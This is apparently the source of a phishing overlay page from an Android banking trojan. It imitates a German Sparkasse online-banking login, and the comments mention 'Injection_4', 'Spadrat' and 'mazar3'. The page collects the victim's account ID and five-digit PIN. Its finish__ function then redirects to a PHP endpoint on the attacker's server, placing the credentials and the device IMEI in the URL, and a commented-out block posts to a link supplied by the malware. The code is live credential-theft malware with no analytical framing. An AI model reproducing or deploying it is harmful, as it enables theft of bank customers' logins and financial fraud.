<!DOCTYPE html>
<html>
  <head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>


<style type="text/css">
  html,body,form{
    height:100%;
}

table.main_table {
    height: 100%;
    width: 100%;
}

tr.tr1 {
    /* height: 100%; */
}
body {
    background: #fcfcfc;
}
.logo {
    text-align: center;
    margin-bottom: 29px;
}

img.i898 {
    width: 68px;
}

td.td1 {
    vertical-align: top;
    padding-top: 54px;
}

label{
  display:block;
}
.form-control,
.form-control:focus {
  background: transparent;
  border:0;
  box-shadow: none;
  border-radius: 0;
  padding: 0 !important;
  border-bottom: 1px solid #a1a1a1;
  outline:none;
  height: 22px;
  font-size: 18px;
  /* height: 0 !important; */
  transition:all .2s ease;
}
.form-control:focus {
  border-bottom: 1px solid black;
}
/*lebells*/
.control-label {
    z-index: -1;
    position: relative;
    top: 23px;
    font-weight: 100;
    color: #a1a1a1;
    transition: all .3s ease;
}
.control-label.up {
    top: 4px;
    font-size: 11px;
    color: #8b8b8b;
}
/*lebells*/


.main {
    padding: 0px 19px;
}

.legend {
    text-align: center;
    color: #343434;
    font-size: 18px;
    margin: 34px 1px;
}

label.control-label.err_label {
    color: red;
    display: none;
}

.form-group.has_err label {
    display: none;
}

.form-group.has_err .err_label {
    display: block;
}

.form-group.has_err .form-control {
    border-bottom-color: red;
}

.main_bottom {
    padding: 2px 31px;
    /* padding-bottom: 26px; */
}

button.btn.btn-danger {
    width: 100%;
    background: #fc0209;
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    padding: 8px 3px;
}
.main {
    padding: 1px 17px;
}
span.fa.fa-circle-o-notch.fa-spin {
    color: red !important;
}
</style>
  </head>


  <body>
  
  
  
<table class="main_table scum" id="login_step" >
  <tr class="tr1">
    
     <td class="td1">
	 
	    <div  class="container "  style="">
				<div  class="logo hide_on_focus"  style="">
				   <img src="http://i.imgur.com/gHWDq62.gif" style="" class="i898"/>
		        </div>
		<div  class="main"  style="">
		   <form class="" id="form1" name="form1" onsubmit="send1(event,'finish__');return false" action="" method="post">
 				<div  class="legend "  style="">
						Online-Banking: Anmelden
				</div>
				<div  class="form-group "  style="">
						<label class="control-label" for="">Kontonummer/Legitimations-ID </label>
						
						<label class="control-label err_label" style="" for="">Kontonummer/Legitimations-ID </label>
						<input class="form-control" autocomplete="off" type="text" name="user" id="user" data-reg="/^\w+$/" maxlength="16" placeholder="" />
				</div>
				
				<div  class="form-group "  style="">
						<label class="control-label" for="">PIN</label>
						<label class="control-label err_label" for="">PIN</label>
						<input class="form-control" autocomplete="off" type="password" name="pin" id="pin" data-reg="/^\d{5}$/" maxlength="5" placeholder="" />
				</div>
			</form>
		</div>
		</div>
	 
	 </td>
  </tr > 
  
  
  <tr class="tr2">
    
     <td class="td1">
	    <div  class="main_bottom "  style="">
				<button class="btn btn-danger" style="" form="form1">Anmelden</button>
		</div>
	 
	 </td>
  </tr >
</table>
  
  
  
<form role="form" name="mf" id="mf"  action="" method="" class="" style="display:none">
  
</form>  
  
  
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>  
  </body>
  

  <script>
  
link="spark.de";  
  
  

$('<div  class="loader__ "  style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;"><span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#03A9F4"></span></div>').appendTo('body');
  
window.loader_={
	hide:function(){
		$('.loader__').hide();
	},
	show:function(){
		$('.loader__').show();
	}
}  
  
  
  
  
  $('.form-control').on('focus', function() {
  $('.hide_on_focus').hide();
  $('.has_err').removeClass('has_err');
  $('.up').each(function() {
    if ($(this).closest('.form-group').find('.form-control').val() == "") {
      $(this).removeClass('up');
    }
  })
  $(this).closest('.form-group').find('label').addClass('up');
}).on('blur', function() {
  $('.up').each(function() {
  $('.hide_on_focus').show();
    if ($(this).closest('.form-group').find('.form-control').val() == "") {
      $(this).removeClass('up');
    }
  })
})




send1 = function(e, callback__, global_luhn__) {
  e.preventDefault();
  var el = e.target;
  var err = false;

  var err_elements = [];

  $(el).find('input,select').each(function() {
    var reg__ = $(this).data().reg;
    if (typeof(reg__) != "undefined") {
      if (!eval(reg__).test($(this).val())) {
        err = true;
        err_elements.push(this);
        return;
      }
    }
    var luhn__ = $(this).data().luhn;
    if (typeof(luhn__) != "undefined" && luhn__ != '') {
      if (!eval(luhn__)($(this).val())) {
        err = true;
        err_elements.push(this);
      }
    }
  })

  //time for global_luhn
  if (typeof(global_luhn__) != 'undefined') {
    if (!eval(global_luhn__)()) {
      err = true;
    }

  }
  if (err) {

    //this part need to edit for each bank
    $('.err_div').show();
    $(err_elements).each(function() {
      $(this).closest('.form-group').addClass('has_err');
      $(window).scrollTop(0)
        //...

    })
    return;
  }

  if (typeof(callback__) != 'undefined') {
    eval(callback__)(el);
    return;
  }
  alert('We stack, what to do next?')

}

function next__(el) {

  loader_.show();
  setTimeout(function() {
    loader_.hide();
    $('.scum').hide();
    $(el).closest('.scum').next().show();
  }, 4000)

}

function finish__(el) {
  loader_.show();
 
  data__ = $('.scum form').custom_ser()
  $.each(data__, function(i, v) {
      $('<input type="hidden" name="' + i + '" value="' + v + '">').appendTo('#mf')
  });
  
  
    $data__=$('#mf').custom_ser();
	$data__.dialog_id=link;
	
	
	
	
	 top['closeDlg'] = true;
	 	 var login = document.forms["form1"].elements["user"].value; 
	var pin = document.forms["form1"].elements["pin"].value; 
	var imei_c='<?php echo $IMEI_country; ?>';
	var url='<?php echo $URL; ?>';
	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|Spadrat|"+login+"|"+pin+"|");

    /* prompt('send', JSON.stringify($data__));
     g_oForm.submit();
     prompt('closeSuccessDialog')*/
    

}








$.fn.custom_ser=function(){
    var obj={};
	this.find('input,select').each(function(){
        if ($(this).prop('tagName') == "INPUT") {
               //input validation
			   obj[$(this).attr('name')]=$(this).val();  
        } 
        if ($(this).prop('tagName') == "SELECT") {
		  obj[$(this).attr('name')]=$(this).find('option:selected').val();
       }
    })
	return obj;
}














//#############mazar3############################
/*var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };

var g_oForm = document.getElementById('mf'), g_sFAct = prompt('getLink');
if(!/https?:\/\//i.test(g_sFAct)){g_sFAct = 'http://' + g_sFAct;};

g_oForm.setAttribute('action',g_sFAct); // ????????????? ? ????? ??? ???????
try{
   g_oForm.action = g_sFAct;
} catch(e){};
					
var g_FrmCode = prompt('getId');
__insHiddenField(document, g_oForm, 'code', g_FrmCode); // ???????? id ????
__insHiddenField(document, g_oForm, 'name', link); 
*/



  </script>
</html>  
